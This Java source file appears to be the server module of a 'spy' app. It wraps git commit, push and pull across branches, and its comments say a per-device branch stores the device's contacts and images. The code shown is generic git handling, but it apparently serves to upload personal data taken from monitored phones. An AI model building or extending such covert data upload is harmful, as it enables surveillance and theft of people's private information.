package com.gameofcoding.spy.server;

import com.gameofcoding.spy.utils.XLog;
import org.eclipse.jgit.api.errors.GitAPIException;

/**
 * Server class is the main part of server package. This is where we upload and download data.
 */
public class Server {
    private static String TAG = "Server";
    private String mDeviceBranch;
    private RepoManager mGitRepo;

    /**
     * Enum that contains directories where different types of data is stored.
     * <p><b>MAIN:</b> This directory contains list of added devices, latest version name of app and other
     * global things</p>
     * <p><b>APP_DATA:</b> This is where app related data is stored, e.g Latest version of app.</p>
     * <p><b>DEVICE:</b> Directory where device related things are stored like device contacts,
     * images, etc.</p>
     */
    public static enum Dir {
	MAIN,
	APP_DATA,
	DEVICE
    };

    /* package */ Server(RepoManager gitRepo, String deviceBranch) {
	mGitRepo = gitRepo;
	mDeviceBranch = deviceBranch;
    }

    private boolean saveChanges() throws GitAPIException {
	// Commit changes
	return mGitRepo.commit("spy_server");
    }

    /**
     * Re-downloads all the directories,
     */
    public boolean reloadData() throws GitAPIException {
	// Save any unsaved changes
	saveChanges();

	// Pull master, app_data and device branch
	XLog.v(TAG, "reloadData(): Pulling '" + ServerManager.BRANCH_MASTER + "'");
        openDir(Dir.MAIN).loadChanges();
	XLog.v(TAG, "reloadData(): Pulling '" + mDeviceBranch + "'");
        openDir(Dir.DEVICE).loadChanges();
	XLog.v(TAG, "All branches successfully pulled!");
	return true;
    }

    /**
     * Opens the specified directory on which you can perform upload and download operations.
     */
    public Directory openDir(Dir dir) throws GitAPIException {
	XLog.v(TAG, "openDir(Directory): Opening dir [dir=" + dir + "]");

	// Save any unsaved changes
	saveChanges();

	boolean hasCheckedOut = false;
	switch(dir) {
	case MAIN:
	    hasCheckedOut = mGitRepo.checkout(ServerManager.BRANCH_MASTER);
            break;
	case APP_DATA:
            if(mGitRepo.hasLocalBranch(ServerManager.BRANCH_APP_DATA))
                hasCheckedOut = mGitRepo.checkout(ServerManager.BRANCH_APP_DATA);
            else {
                if(mGitRepo.fetchBranch(ServerManager.BRANCH_APP_DATA)) {
                        if(mGitRepo.setRemoteTrackingBranch(ServerManager.BRANCH_APP_DATA,
                                                            ServerManager.BRANCH_APP_DATA)) {
                            hasCheckedOut = mGitRepo.checkout(ServerManager.BRANCH_APP_DATA);
                        }
                    }
            }
            break;
	case DEVICE:
	    hasCheckedOut = mGitRepo.checkout(mDeviceBranch);
            break;
	}
	if(hasCheckedOut)
	    return new Directory(mGitRepo);
	else
	    return null;
    }

    /**
     * Class that represents one directory.
     */
    public class Directory {
	private static final String TAG = "Directory";
	private RepoManager mGitRepo;

	private Directory(RepoManager gitRepo) {
	    mGitRepo = gitRepo;
	}

	/**
	 * Uploads data of currently opened directory
	 */
	public boolean uploadData() throws GitAPIException {
	    // Commit and push changes
	    if(saveChanges()) {
		XLog.i(TAG, "Pushing changes to remote");
		if(mGitRepo.push()) {
		    XLog.i(TAG, "Data pushed to remote");
		    return true;
		}
	    }
	    return false;
	}

        /**
         * Pulls the data for currently opened directory
         */
        public boolean loadChanges() throws GitAPIException {
            if(saveChanges()) {
                XLog.v(TAG, "Pulling changes from remote");
                if(mGitRepo.pull()) {
                    XLog.v(TAG, "Changes pulled");
                    return true;
                }
            }
            return false;
        }

	/**
	 * Closes opened directory.
	 * <b>NOTE: It just saves changes and nothing else.</b>
	 */
	public boolean close() throws GitAPIException {
	    return saveChanges();
	}
    }
}
